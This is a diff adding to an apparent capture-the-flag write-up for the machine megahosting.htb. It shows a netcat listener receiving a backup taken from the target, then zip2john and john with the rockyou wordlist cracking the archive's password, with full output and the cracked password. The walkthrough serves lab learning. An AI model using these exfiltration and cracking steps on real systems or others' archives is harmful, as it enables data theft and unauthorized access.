@@ -152,3 +152,33 @@ root@kali:~# nc -lvp 9002 > *.zip
 Listening on 0.0.0.0 9002
 Connection received on megahosting.htb 35208
 ```
+
+However I wasnt able to view anything because the zip backup was password protected. In order to unlock it I used **zip2john** to convert the archive into a crackable hash and then give it to john to crack.
+
+```sh
+root@kali:~# zip2john backup.zip
+backup.zip/var/www/html/assets/ is not encrypted!
+ver 1.0 backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
+ver 1.0 backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
+ver 1.0 efh 5455 efh 7875 backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
+ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
+ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
+backup.zip:$pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:backup.zip
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+root@kali:~# nano backupfile.hash
+root@kali:~# john backupfile.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin@it         (backup.zip)
+1g 0:00:00:01 DONE (2020-11-08 15:49) 0.6849g/s 7097Kp/s 7097Kc/s 7097KC/s adnc153..adenabuck
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~# 
+
+```
